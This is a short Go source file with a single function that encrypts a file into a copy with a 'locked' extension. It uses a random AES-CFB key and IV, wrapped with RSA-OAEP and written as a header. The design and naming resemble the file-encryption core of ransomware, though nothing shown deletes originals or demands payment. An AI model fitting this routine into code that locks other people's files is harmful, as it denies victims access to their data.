package main

import (
	"crypto/rsa"
	"io"
	"os"

	"crypto/aes"
	"crypto/rand"

	"crypto/cipher"

	"crypto/sha256"
)

func encrypt(file string, priv *rsa.PrivateKey) {
	inFile, err := os.Open(file)

	if err != nil {
		panic(err)
	}

	defer inFile.Close()

	outFile, err := os.OpenFile(file+LockedExtension, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)

	if err != nil {
		panic(err)
	}

	defer outFile.Close()

	key := make([]byte, KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey

	label := []byte("")
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, label)

	if err != nil {
		panic(err)
	}

	_, err = outFile.Write(header)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	reader := &cipher.StreamReader{S: stream, R: inFile}

	_, err = io.Copy(outFile, reader)
	if err != nil {
		panic(err)
	}
}
